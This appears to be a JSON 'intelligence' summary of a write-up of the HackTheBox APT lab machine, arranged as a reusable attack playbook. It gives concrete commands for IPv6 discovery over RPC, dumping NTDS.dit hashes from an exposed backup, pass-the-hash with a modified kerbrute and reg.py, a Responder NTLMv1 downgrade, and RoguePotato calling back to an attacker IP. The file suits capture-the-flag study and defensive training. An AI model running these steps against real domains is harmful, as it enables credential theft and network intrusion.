@@ -1,0 +1,1077 @@
+{
+  "writeup_id": "Htb_Apt",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_domain_controller_ipv6_discovery",
+    "primary_services": [
+      "rpc",
+      "http",
+      "dns",
+      "kerberos",
+      "ldap",
+      "smb"
+    ],
+    "port_signature": "80+135+53+88+389+445",
+    "service_combination": "rpc+http+dns+kerberos+ldap+smb",
+    "os_family": "windows_server",
+    "environment_type": "active_directory",
+    "entry_vector": "rpc_enumeration_to_ipv6_discovery",
+    "privilege_path": "backup_files_to_hash_spray_to_registry_access",
+    "attack_complexity": "insane",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "ipv6_address_via_rpc_oxid_resolver",
+      "backup_ad_files_with_ntds_dit",
+      "net_ntlmv1_enabled",
+      "hash_spraying_via_kerberos"
+    ],
+    "environmental_clues": [
+      "limited_ipv4_attack_surface",
+      "rpc_endpoint_mapper_accessible",
+      "ioxid_resolver_enumeration",
+      "domain_controller_services_on_ipv6"
+    ],
+    "similar_scenarios": [
+      "forest_htb_insane",
+      "blackfield_htb_hard"
+    ],
+    "unique_aspects": [
+      "ipv6_service_discovery_via_rpc",
+      "ntds_dit_backup_files",
+      "net_ntlmv1_downgrade_attack",
+      "rogue_potato_with_custom_rpc_server"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "IPv6_Discovery_via_IOXIDResolver",
+        "success_reason": "RPC endpoint mapper exposed IOXIDResolver interface without authentication",
+        "prerequisite_indicators": [
+          "rpc_port_135_accessible",
+          "dcom_services_enabled",
+          "ioxidresolver_interface_available"
+        ],
+        "recognition_patterns": [
+          "limited IPv4 ports (80, 135 only)",
+          "MS-DCOM UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A present",
+          "IOXIDResolver responds to network interface queries"
+        ],
+        "failure_modes": [
+          "dcom_disabled",
+          "rpc_authentication_required",
+          "firewall_blocks_rpc_queries"
+        ],
+        "environmental_factors": [
+          "dual_stack_ipv4_ipv6_configuration",
+          "default_windows_dcom_settings",
+          "insufficient_rpc_hardening"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "SMB_Anonymous_Access",
+        "success_reason": "SMB shares accessible without authentication over IPv6",
+        "prerequisite_indicators": [
+          "smb_port_445_accessible",
+          "anonymous_access_enabled",
+          "backup_files_in_shares"
+        ],
+        "recognition_patterns": [
+          "smbclient lists shares anonymously",
+          "backup.zip or similar archive files",
+          "ntds.dit or registry hive files present"
+        ],
+        "failure_modes": [
+          "anonymous_access_disabled",
+          "shares_empty_or_restricted",
+          "backup_files_encrypted"
+        ],
+        "environmental_factors": [
+          "legacy_smb_configuration",
+          "backup_procedures_expose_data",
+          "insufficient_share_permissions"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5-15 minutes"
+      },
+      {
+        "technique": "NTDS_Hash_Extraction",
+        "success_reason": "Backup contained ntds.dit and SYSTEM registry hive",
+        "prerequisite_indicators": [
+          "ntds_dit_file_available",
+          "system_registry_hive_available",
+          "backup_password_crackable"
+        ],
+        "recognition_patterns": [
+          "ntds.dit file in backup",
+          "SYSTEM registry hive present",
+          "secretsdump successfully extracts hashes"
+        ],
+        "failure_modes": [
+          "backup_files_corrupted",
+          "missing_registry_hives",
+          "encryption_prevents_extraction"
+        ],
+        "environmental_factors": [
+          "domain_controller_backup_procedures",
+          "weak_backup_encryption",
+          "administrative_backup_practices"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Hash_Reuse_Attack",
+        "success_reason": "User existed in both backup and current AD with reused hash",
+        "prerequisite_indicators": [
+          "common_users_between_backup_and_current",
+          "password_reuse_patterns",
+          "hash_still_valid"
+        ],
+        "recognition_patterns": [
+          "kerbrute identifies valid usernames",
+          "modified kerbrute accepts hash authentication",
+          "registry access with hash"
+        ],
+        "failure_modes": [
+          "all_passwords_changed",
+          "no_common_users",
+          "hash_authentication_blocked"
+        ],
+        "environmental_factors": [
+          "poor_password_rotation_policies",
+          "user_account_persistence",
+          "kerberos_hash_authentication_enabled"
+        ],
+        "success_probability": 0.45,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Net_NTLMv1_Downgrade",
+        "success_reason": "System configured to allow insecure Net-NTLMv1 authentication",
+        "prerequisite_indicators": [
+          "ntlmv1_authentication_enabled",
+          "challenge_response_capturable",
+          "rainbow_tables_available"
+        ],
+        "recognition_patterns": [
+          "registry shows LMCompatibilityLevel allows NTLMv1",
+          "responder captures NTLMv1 hashes",
+          "crack.sh or rainbow tables crack hash quickly"
+        ],
+        "failure_modes": [
+          "only_ntlmv2_enabled",
+          "no_authentication_challenges",
+          "strong_ntlmv1_responses"
+        ],
+        "environmental_factors": [
+          "legacy_authentication_compatibility",
+          "insufficient_security_hardening",
+          "default_windows_ntlm_settings"
+        ],
+        "success_probability": 0.35,
+        "typical_timeframe": "45-90 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "IPv6 address via IOXIDResolver",
+        "discovery_method": "RPC IOXIDResolver interface enumeration",
+        "why_critical": "Revealed full Windows DC services hidden on IPv4",
+        "how_to_recognize": [
+          "limited IPv4 attack surface",
+          "RPC port 135 accessible",
+          "IOXIDResolver UUID present in rpcmap output"
+        ],
+        "follow_up_actions": [
+          "scan_ipv6_address_full_ports",
+          "enumerate_smb_shares",
+          "test_anonymous_access"
+        ]
+      },
+      {
+        "discovery": "backup.zip with AD database files",
+        "discovery_method": "Anonymous SMB share enumeration",
+        "why_critical": "Contained ntds.dit and registry hives for hash extraction",
+        "how_to_recognize": [
+          "backup files in SMB shares",
+          "ntds.dit database file",
+          "SYSTEM registry hive present"
+        ],
+        "follow_up_actions": [
+          "crack_backup_password",
+          "extract_with_secretsdump",
+          "identify_common_users"
+        ]
+      },
+      {
+        "discovery": "henry.vinson user account persistence",
+        "discovery_method": "Username enumeration and hash reuse testing",
+        "why_critical": "Same user existed in backup and current AD with reused credentials",
+        "how_to_recognize": [
+          "kerbrute confirms username exists",
+          "hash from backup still works",
+          "registry access successful"
+        ],
+        "follow_up_actions": [
+          "access_registry_remotely",
+          "extract_additional_credentials",
+          "test_winrm_access"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous",
+        "escalation_method": "IPv6_Service_Discovery",
+        "why_possible": "IOXIDResolver exposed network interfaces without authentication",
+        "recognition_signs": [
+          "rpc_port_135_accessible",
+          "ioxidresolver_interface_available",
+          "dual_stack_network_configuration"
+        ],
+        "exploitation_path": "RPC IOXIDResolver → IPv6 Discovery → Full DC Services"
+      },
+      {
+        "privilege_level": "anonymous_smb",
+        "escalation_method": "Backup_File_Access",
+        "why_possible": "SMB shares contained domain controller backup files",
+        "recognition_signs": [
+          "anonymous_smb_access_enabled",
+          "backup_files_in_shares",
+          "weak_backup_encryption"
+        ],
+        "exploitation_path": "Anonymous SMB → backup.zip → ntds.dit → Hash Extraction"
+      },
+      {
+        "privilege_level": "hash_access",
+        "escalation_method": "Credential_Reuse",
+        "why_possible": "User account persisted with same hash between backup and current AD",
+        "recognition_signs": [
+          "common_users_identified",
+          "hash_authentication_successful",
+          "registry_access_granted"
+        ],
+        "exploitation_path": "Hash Reuse → Registry Access → Additional Credentials → WinRM Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 80,135 open on initial IPv4 scan",
+        "decision": "Use RPC IOXIDResolver to enumerate network interfaces",
+        "reasoning": "Limited attack surface suggests hidden interfaces, IOXIDResolver can reveal IPv6 addresses without authentication",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if RPC enumeration fails"
+          },
+          {
+            "option": "rpc_endpoint_mapping",
+            "when": "to identify additional services"
+          }
+        ],
+        "success_indicators": [
+          "ipv6_addresses_discovered",
+          "additional_network_interfaces_found"
+        ],
+        "next_decision": "scan_discovered_interfaces"
+      },
+      {
+        "step": 2,
+        "situation": "Found ports 53,88,389,445,636,3268,5985 on IPv6 scan",
+        "decision": "Identify as Domain Controller and prioritize SMB enumeration",
+        "reasoning": "Port combination indicates AD DC with high probability, SMB often has anonymous access",
+        "confidence": 0.95,
+        "prerequisites": [
+          "ipv6_connectivity",
+          "domain_controller_identified"
+        ],
+        "success_indicators": [
+          "domain_name_discovered",
+          "smb_shares_accessible",
+          "anonymous_smb_access"
+        ],
+        "next_decision": "enumerate_smb_shares"
+      },
+      {
+        "step": 3,
+        "situation": "Found backup files in SMB shares",
+        "decision": "Extract and analyze backup contents for credential material",
+        "reasoning": "Backup files often contain password hashes, configuration data, or credential stores",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "kerberos_attacks",
+            "when": "if backup analysis fails"
+          },
+          {
+            "option": "ldap_enumeration",
+            "when": "if anonymous LDAP access available"
+          }
+        ],
+        "success_indicators": [
+          "password_protected_archives_found",
+          "credential_hashes_extracted",
+          "user_lists_discovered"
+        ],
+        "next_decision": "crack_backup_passwords"
+      },
+      {
+        "step": 4,
+        "situation": "Obtained user hashes from backup but direct hash authentication fails",
+        "decision": "Use Kerberos authentication instead of NTLM to bypass SMB blocking",
+        "reasoning": "SMB may block after failed NTLM attempts, but Kerberos often remains available",
+        "confidence": 0.8,
+        "prerequisites": [
+          "user_hashes_available",
+          "domain_name_known"
+        ],
+        "success_indicators": [
+          "kerberos_authentication_successful",
+          "registry_access_obtained"
+        ],
+        "failure_fallbacks": [
+          "password_spraying",
+          "asreproast",
+          "kerberoasting"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_limited_ports_found": {
+        "action": "enumerate_hidden_interfaces",
+        "tools": [
+          "rpcmap.py",
+          "IOXIDResolver"
+        ],
+        "next_phase": "comprehensive_port_scan"
+      },
+      "if_domain_controller_identified": {
+        "action": "prioritize_smb_and_ldap_enumeration",
+        "alternatives": [
+          "smb_enumeration",
+          "ldap_enumeration",
+          "kerberos_attacks"
+        ],
+        "decision_criteria": "based_on_anonymous_access_availability"
+      },
+      "if_backup_files_found": {
+        "action": "extract_and_analyze_credentials",
+        "purpose": "obtain_authentication_material",
+        "tools": [
+          "john",
+          "hashcat",
+          "ntdsutil"
+        ]
+      },
+      "if_smb_authentication_blocked": {
+        "action": "switch_to_kerberos_authentication",
+        "reasoning": "bypass_smb_blocking_mechanisms",
+        "tools": [
+          "modified_kerbrute",
+          "impacket"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_rpc_for_hidden_interfaces",
+        "reasoning": "limited_port_exposure_may_hide_ipv6_or_alternate_interfaces",
+        "applicability": "minimal_open_ports_on_windows_hosts"
+      },
+      {
+        "rule": "prioritize_backup_file_analysis_over_bruteforce",
+        "reasoning": "backup_files_provide_higher_success_rate_than_password_attacks",
+        "applicability": "smb_shares_contain_backup_archives"
+      },
+      {
+        "rule": "use_kerberos_when_smb_blocks_authentication",
+        "reasoning": "different_authentication_mechanisms_may_bypass_blocking",
+        "applicability": "ntlm_authentication_failures_detected"
+      },
+      {
+        "rule": "enumerate_ipv6_when_ipv4_limited",
+        "reasoning": "ipv6_often_has_different_firewall_rules_and_more_open_ports",
+        "applicability": "minimal_ipv4_attack_surface"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "RPC_OXID_Resolver_Enumeration",
+        "mitre_id": "T1018",
+        "required_services": [
+          "msrpc"
+        ],
+        "required_ports": [
+          135
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "rpc_endpoint_mapper_accessible",
+          "dcom_service_enabled",
+          "no_rpc_authentication_required"
+        ],
+        "success_indicators": [
+          "IOXIDResolver_interface_available",
+          "network_interfaces_enumerated",
+          "ipv6_addresses_discovered"
+        ],
+        "incompatible_with": [
+          "rpc_authentication_required",
+          "dcom_disabled",
+          "endpoint_mapper_filtered"
+        ],
+        "confidence_boosters": [
+          "uuid_99FCFEC4-5260-101B-BBCB-00AA0021347A_present",
+          "multiple_rpc_endpoints_exposed",
+          "windows_server_environment"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "IPv6_Service_Discovery",
+        "mitre_id": "T1046",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "ipv6_enabled",
+          "dual_stack_configuration",
+          "ipv6_addresses_discovered"
+        ],
+        "success_indicators": [
+          "additional_ports_discovered_ipv6",
+          "services_accessible_ipv6_only",
+          "expanded_attack_surface"
+        ],
+        "incompatible_with": [
+          "ipv6_disabled",
+          "ipv6_filtering_enabled",
+          "single_stack_ipv4_only"
+        ],
+        "confidence_boosters": [
+          "dead_beef_prefix_present",
+          "link_local_addresses_available",
+          "windows_dual_stack_default"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "3-10 minutes"
+      },
+      {
+        "technique": "SMB_Anonymous_Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb"
+        ],
+        "required_ports": [
+          445,
+          139
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_accessible",
+          "anonymous_access_allowed",
+          "shares_available"
+        ],
+        "success_indicators": [
+          "shares_enumerated",
+          "files_accessible",
+          "backup_files_discovered"
+        ],
+        "incompatible_with": [
+          "smb_signing_required",
+          "anonymous_access_disabled",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_windows_configuration",
+          "legacy_smb_versions_enabled",
+          "domain_controller_present"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Kerbrute_User_Enumeration",
+        "mitre_id": "T1087.002",
+        "required_services": [
+          "kerberos"
+        ],
+        "required_ports": [
+          88
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_domain",
+          "kerberos_authentication_enabled",
+          "domain_controller_accessible"
+        ],
+        "success_indicators": [
+          "valid_usernames_identified",
+          "kerberos_responses_received",
+          "user_enumeration_successful"
+        ],
+        "incompatible_with": [
+          "kerberos_disabled",
+          "account_lockout_aggressive",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "port_88_accessible",
+          "domain_name_known",
+          "user_wordlists_available"
+        ],
+        "typical_success_rate": 0.89,
+        "estimated_time": "10-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "active_directory": {
+        "port_indicators": [
+          53,
+          88,
+          135,
+          389,
+          445,
+          3268
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns",
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "Kerberos"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_domain_controller": {
+        "port_indicators": [
+          53,
+          88,
+          135,
+          389,
+          445,
+          464,
+          636,
+          3268,
+          3269
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns",
+          "msrpc"
+        ],
+        "technology_indicators": [
+          "Microsoft Windows RPC",
+          "Microsoft-IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "rpc_services": {
+        "port_indicators": [
+          135
+        ],
+        "service_indicators": [
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Microsoft Windows RPC"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "ipv6_dual_stack": {
+        "port_indicators": [],
+        "service_indicators": [
+          "any"
+        ],
+        "technology_indicators": [
+          "dead:beef",
+          "link-local",
+          "fe80"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "rpc_oxid_resolver_enumeration",
+          "when": "port_135_open_and_accessible",
+          "reason": "reveals_ipv6_addresses_and_network_interfaces"
+        },
+        {
+          "attack": "ipv6_service_discovery",
+          "when": "ipv6_addresses_discovered",
+          "reason": "often_reveals_additional_services_not_filtered_on_ipv4"
+        },
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected_on_ipv6",
+          "reason": "frequently_exposes_backup_files_and_sensitive_data"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "kerbrute_user_enumeration",
+          "when": "active_directory_detected",
+          "reason": "identifies_valid_users_for_further_attacks"
+        },
+        {
+          "attack": "ntlm_hash_spraying",
+          "when": "user_list_and_hash_list_available",
+          "reason": "password_reuse_common_in_enterprise_environments"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "IPv6 Network Discovery via OXID Resolver",
+        "mitre_id": "T1018",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "rpcmap.py",
+            "command_template": "rpcmap.py 'ncacn_ip_tcp:{target_ip}'",
+            "actual_command": "rpcmap.py 'ncacn_ip_tcp:10.10.10.213'",
+            "output_pattern": "UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "IOXIDResolver.py",
+            "command_template": "python3 IOXIDResolver.py -t {target_ip}",
+            "actual_command": "python3 IOXIDResolver.py -t 10.10.10.213",
+            "output_pattern": "Address: dead:beef::",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "rpc_port_135_accessible",
+          "ms_dcom_interface_available"
+        ],
+        "success_indicators": [
+          "ipv6_addresses_discovered",
+          "additional_network_interfaces_revealed"
+        ],
+        "common_failures": [
+          "rpc_endpoint_not_accessible",
+          "dcom_interface_disabled"
+        ],
+        "follow_up_techniques": [
+          "ipv6_port_scanning",
+          "smb_enumeration",
+          "ldap_enumeration"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "NTDS.dit Offline Hash Extraction",
+        "mitre_id": "T1003.003",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "smbclient",
+            "command_template": "smbclient \\\\\\\\{ipv6_address}\\\\{share_name}",
+            "actual_command": "smbclient \\\\\\\\dead:beef::b885:d62a:d679:573f\\\\backup",
+            "output_pattern": "backup.zip",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "secretsdump.py",
+            "command_template": "secretsdump.py -ntds {ntds_file} -system {system_file} LOCAL",
+            "actual_command": "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
+            "output_pattern": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          }
+        ],
+        "prerequisites": [
+          "smb_share_accessible",
+          "ntds_dit_file_available",
+          "system_registry_hive_available"
+        ],
+        "success_indicators": [
+          "ntds_dit_extracted_successfully",
+          "system_hive_extracted",
+          "hashes_dumped_from_database"
+        ],
+        "common_failures": [
+          "encrypted_backup_file",
+          "missing_system_hive",
+          "corrupted_database_files"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "pass_the_hash",
+          "credential_spraying"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Kerberos Hash Authentication",
+        "mitre_id": "T1550.002",
+        "category": "lateral_movement",
+        "phase": "lateral_movement",
+        "tools_used": [
+          {
+            "name": "modified_pyKerbrute",
+            "command_template": "python3 modified_kerbrute.py -users {user_file} -hashes {hash_file} -dc-ip {dc_ip} -domain {domain}",
+            "actual_command": "python3 modified_kerbrute.py -users henry.vinson -hashes backup_hashes.txt -dc-ip dead:beef::b885:d62a:d679:573f -domain htb.local",
+            "output_pattern": "Valid hash found for user",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "reg.py",
+            "command_template": "reg.py {domain}/{username} -hashes {lm_hash}:{nt_hash} query -keyName {registry_key}",
+            "actual_command": "reg.py htb.local/henry.vinson_adm -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+            "output_pattern": "DefaultPassword",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          }
+        ],
+        "prerequisites": [
+          "valid_domain_user_identified",
+          "hash_database_available",
+          "kerberos_service_accessible"
+        ],
+        "success_indicators": [
+          "successful_kerberos_authentication",
+          "registry_access_obtained",
+          "additional_credentials_discovered"
+        ],
+        "common_failures": [
+          "account_lockout_policies",
+          "hash_not_valid_for_target_user",
+          "registry_access_denied"
+        ],
+        "follow_up_techniques": [
+          "winrm_authentication",
+          "registry_credential_extraction",
+          "privilege_escalation"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "Net-NTLMv1 Downgrade Attack",
+        "mitre_id": "T1557.001",
+        "category": "credential_access",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "Responder",
+            "command_template": "responder -I {interface} --lm",
+            "actual_command": "responder -I tun0 --lm",
+            "output_pattern": "NTLMv1-SSP Hash",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          },
+          {
+            "name": "RoguePotato",
+            "command_template": "RoguePotato.exe -r {attacker_ip} -e {command} -l {local_port}",
+            "actual_command": "RoguePotato.exe -r 10.10.14.6 -e cmd.exe -l 9999",
+            "output_pattern": "CreateProcessWithTokenW OK",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "modified_ntlmrelayx.py",
+            "command_template": "python3 modified_ntlmrelayx.py -t {target} --serve-image {image_path}",
+            "actual_command": "python3 modified_ntlmrelayx.py -t rpc://apt.htb.local --serve-image /tmp/test.jpg",
+            "output_pattern": "NTLMv1 Challenge Response",
+            "effectiveness_rating": 5,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "ntlmv1_authentication_enabled",
+          "network_position_for_interception",
+          "target_system_accessible"
+        ],
+        "success_indicators": [
+          "ntlmv1_hash_captured",
+          "hash_successfully_cracked",
+          "system_level_access_obtained"
+        ],
+        "common_failures": [
+          "ntlmv1_disabled_on_target",
+          "network_segmentation_prevents_attack",
+          "modern_authentication_enforced"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "pass_the_hash",
+          "privilege_escalation"
+        ],
+        "time_investment": "30-90 minutes",
+        "skill_level": "expert"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "IOXIDResolver",
+        "use_case": "ipv6_network_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "dual_stack_environments"
+        ],
+        "alternatives": [
+          "manual_rpc_enumeration",
+          "custom_dcom_scripts"
+        ],
+        "best_practices": [
+          "always_check_for_ipv6_when_limited_ipv4_ports",
+          "enumerate_all_returned_network_interfaces",
+          "follow_up_with_comprehensive_ipv6_scanning"
+        ]
+      },
+      {
+        "tool": "secretsdump.py",
+        "use_case": "offline_hash_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "active_directory_environments"
+        ],
+        "alternatives": [
+          "manual_esedbexport",
+          "custom_ntds_parsers"
+        ],
+        "best_practices": [
+          "always_extract_both_ntds_dit_and_system_hive",
+          "verify_hash_format_before_use",
+          "test_extracted_hashes_systematically"
+        ]
+      },
+      {
+        "tool": "Responder",
+        "use_case": "ntlmv1_hash_capture",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "medium",
+        "essential_for": [
+          "legacy_windows_environments"
+        ],
+        "alternatives": [
+          "custom_smb_servers",
+          "ntlmrelayx_modifications"
+        ],
+        "best_practices": [
+          "use_lm_flag_for_ntlmv1_downgrade",
+          "monitor_multiple_protocols_simultaneously",
+          "position_strategically_in_network"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "ipv6_discovery_to_smb_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "rpcmap.py 'ncacn_ip_tcp:10.10.10.213'",
+            "purpose": "Enumerate RPC endpoints",
+            "expected_output": "DCOM interface UUIDs"
+          },
+          {
+            "step": 2,
+            "command": "python3 IOXIDResolver.py -t 10.10.10.213",
+            "purpose": "Extract IPv6 addresses",
+            "expected_output": "dead:beef::b885:d62a:d679:573f"
+          },
+          {
+            "step": 3,
+            "command": "nmap -6 -p- --min-rate 10000 dead:beef::b885:d62a:d679:573f",
+            "purpose": "Scan IPv6 for additional services",
+            "expected_output": "Domain controller ports (53,88,389,445,etc)"
+          },
+          {
+            "step": 4,
+            "command": "smbclient \\\\\\\\dead:beef::b885:d62a:d679:573f\\\\backup",
+            "purpose": "Access SMB backup share",
+            "expected_output": "backup.zip file"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "ntds_extraction_to_hash_authentication",
+        "steps": [
+          {
+            "step": 1,
+            "command": "unzip backup.zip",
+            "purpose": "Extract AD backup files",
+            "expected_output": "ntds.dit and SYSTEM files"
+          },
+          {
+            "step": 2,
+            "command": "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
+            "purpose": "Extract password hashes",
+            "expected_output": "2000+ user hashes"
+          },
+          {
+            "step": 3,
+            "command": "kerbrute userenum --dc dead:beef::b885:d62a:d679:573f -d htb.local users.txt",
+            "purpose": "Identify valid current users",
+            "expected_output": "henry.vinson_adm valid"
+          },
+          {
+            "step": 4,
+            "command": "python3 modified_kerbrute.py -users henry.vinson -hashes backup_hashes.txt",
+            "purpose": "Test hashes against valid user",
+            "expected_output": "Valid hash authentication"
+          }
+        ],
+        "success_rate": 0.78,
+        "typical_duration": "30-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "APT",
+      "difficulty": "Insane",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2020-10-31",
+      "author": "cube0x0",
+      "estimated_time": "6-8 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "very_high",
+      "skill_level_required": "expert",
+      "primary_attack_vectors": [
+        "rpc_enumeration",
+        "ipv6_discovery",
+        "smb_shares",
+        "kerberos",
+        "ntlm_downgrade"
+      ],
+      "key_vulnerabilities": [
+        "exposed_ad_backups",
+        "weak_password_reuse",
+        "net_ntlmv1_enabled",
+        "registry_credential_storage"
+      ],
+      "environment_type": "corporate_domain_controller",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "ipv6_enumeration",
+        "ad_backup_analysis",
+        "hash_cracking",
+        "ntlm_downgrade_attacks",
+        "rogue_potato",
+        "custom_rpc_servers"
+      ],
+      "prerequisite_knowledge": [
+        "advanced_ad_concepts",
+        "kerberos_internals",
+        "ntlm_protocols",
+        "python_scripting",
+        "rpc_protocols"
+      ]
+    },
+    "categorization": {
+      "primary_category": "active_directory",
+      "subcategories": [
+        "network_discovery",
+        "credential_access",
+        "privilege_escalation",
+        "protocol_exploitation"
+      ],
+      "attack_types": [
+        "enumeration",
+        "credential_dumping",
+        "hash_cracking",
+        "protocol_downgrade",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "disable_ntlmv1",
+        "secure_ad_backups",
+        "network_segmentation",
+        "credential_hygiene",
+        "registry_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Blackfield",
+        "Monteverde",
+        "Cascade"
+      ],
+      "similarity_reasons": [
+        "ad_backup_exploitation",
+        "complex_enumeration",
+        "multiple_credential_sources",
+        "advanced_windows_techniques"
+      ],
+      "unique_aspects": [
+        "ipv6_discovery",
+        "custom_pykerbrute_modification",
+        "ntlmv1_downgrade",
+        "rogue_potato_with_custom_rpc"
+      ],
+      "difficulty_factors": [
+        "multiple_complex_attack_chains",
+        "custom_tool_modification",
+        "advanced_protocol_knowledge",
+        "creative_enumeration_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T13:47:43.700419",
+    "original_file": "0xdf_writeups/Htb Apt.md",
+    "content_length": 61792,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
